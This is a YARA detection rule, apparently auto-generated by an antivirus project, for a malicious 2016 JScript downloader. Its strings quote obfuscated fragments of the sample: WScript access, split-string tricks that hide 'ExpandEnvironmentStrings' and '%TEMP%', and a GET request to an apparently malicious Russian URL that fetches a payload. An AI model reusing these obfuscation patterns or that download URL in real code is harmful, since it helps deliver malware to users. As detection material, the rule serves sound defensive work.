rule sig_20160428_a6d5fc632ce1d9b8439c5e88c243db8d {
  meta:
    description = "datamaliciousorder - file 20160428_a6d5fc632ce1d9b8439c5e88c243db8d.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "8703c95a8e449bb29cc21562627660c65cbfb4905a76b7fa742c99feb63cbec8"

  strings:
    $s1  = "function YrsVeeTaeOzzQhhEauQsh(JsrVjhMkoLyeVkqRniCcw){VplYoeMjqEzdTwtSstWyx[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function YrsVeeTaeOzzQhhEauQsh(JsrVjhMkoLyeVkqRniCcw){VplYoeMjqEzdTwtSstWyx[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function LulXdnBtdBztLmgAsxCec() {return VplYoeMjqEzdTwtSstWyx[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s4  = "function HwqDmnJvuFegXpzScfMsm(TweAmrYwkBqrKrzYmbAfj, DusJyzOqvRomKuvOemRfe){ErzBvpDtuRllFibNroGlh = ErzBvpDtuRllFibNroGlh * 1; " ascii
    $s5  = "return TweAmrYwkBqrKrzYmbAfj - DusJyzOqvRomKuvOemRfe;};" fullword ascii
    $s6  = "BlzSphJtbOrpWifJciTdm[UjvBnhBozRixOvlYhtVjl](\"G\" + \"ET\", \"http://banketcentr.ru/v8usja\", false);" fullword ascii
    $s7  = "var ZmpFqnXxuDtwWmoHhdSpw = this[\"WScript\"];" fullword ascii
    $s8  = "function LulXdnBtdBztLmgAsxCec() {return VplYoeMjqEzdTwtSstWyx[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s9  = "if (BlzSphJtbOrpWifJciTdm[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s10 = "function RfuQrhJxzAshMzaKwtRab(){return KcrNudHbjEpfTtnFqjAnw + \"\";};" fullword ascii
    $s11 = "function HwqDmnJvuFegXpzScfMsm(TweAmrYwkBqrKrzYmbAfj, DusJyzOqvRomKuvOemRfe){ErzBvpDtuRllFibNroGlh = ErzBvpDtuRllFibNroGlh * 1; " ascii
    $s12 = "var VplYoeMjqEzdTwtSstWyx = function IewKznQcaClcUrzOtkBqw() {return ZmpFqnXxuDtwWmoHhdSpw[GeiSnxWsyIriYfoBqaJzs](\"WScript\"+\"" ascii
    $s13 = "function VdqVrfIweNicFoeUnbLqr() {return ((VdhDjyVkqRbaZfmOigQho == true) && (VdhDjyVkqRbaZfmOigQho == TyaEikTeoXdxZgrSbtOjj)) ?" ascii
    $s14 = "function VdqVrfIweNicFoeUnbLqr() {return ((VdhDjyVkqRbaZfmOigQho == true) && (VdhDjyVkqRbaZfmOigQho == TyaEikTeoXdxZgrSbtOjj)) ?" ascii
    $s15 = "var VplYoeMjqEzdTwtSstWyx = function IewKznQcaClcUrzOtkBqw() {return ZmpFqnXxuDtwWmoHhdSpw[GeiSnxWsyIriYfoBqaJzs](\"WScript\"+\"" ascii
    $s16 = "VdhDjyVkqRbaZfmOigQho = true; " fullword ascii
    $s17 = "var TyaEikTeoXdxZgrSbtOjj = false;" fullword ascii
    $s18 = "var MuxTxnXwvHfcRmkHonUnj = new this[\"D\"+\"ate\"]();" fullword ascii
    $s19 = "function UsyDbhSxaRkdJknAtvFte()" fullword ascii
    $s20 = "var KgxDulEhnEejJjbYvcTen = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}